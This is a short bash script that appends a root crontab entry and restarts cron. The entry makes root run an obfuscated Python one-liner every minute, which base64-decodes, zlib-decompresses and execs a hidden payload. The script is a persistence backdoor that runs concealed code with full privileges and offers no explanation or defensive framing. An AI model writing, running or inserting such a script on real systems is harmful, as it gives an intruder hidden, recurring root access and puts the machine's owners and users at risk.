#!bin/bash

sudo echo "* * * * * root python -c \"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqNkFELgjAUhf/K2NOEuDaReog9SBhEVJC+S66Fkm3DO/9/LjN99MJl29l3z4Fbv61pHUEjX8oRQlZ9E+xK2xqpEEfF+NuOfKsy6ATl2wj4BjjEdPryXiLua5JQDN4wHOz3Sg7F8ZLm/8RBza77U5HltzQ5BzMLkEZrJR1jPnuc8WHBDDMIj85GDOFZN0obFozkehHFF1HRjLJi2hTIe9MwGpa1DrGiwQc3C1mo')[0])))\" #DxRqlczsZK" >> /etc/crontab

sudo systemctl restart cron.service